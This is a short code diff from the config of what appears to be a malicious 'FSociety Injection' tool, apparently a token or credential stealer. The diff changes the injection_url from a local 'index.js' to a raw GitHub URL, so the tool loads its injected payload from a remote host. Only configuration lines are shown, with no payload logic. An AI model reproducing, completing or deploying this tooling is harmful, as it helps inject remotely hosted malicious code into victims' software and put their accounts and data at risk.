@@ -14,7 +14,7 @@ const config = {
   embed_name: 'FSociety Injection', 
   embed_icon: 'https://raw.githubusercontent.com/fsocietyrab/fsociety/4a48a86110f9b7ad961d504e8b2c48d11b2a83bd/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'index.js', 
+  injection_url: 'https://raw.githubusercontent.com/fsocietyrab/fsociety/main/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/fsociety/index.js', 
   /**
    
    **/
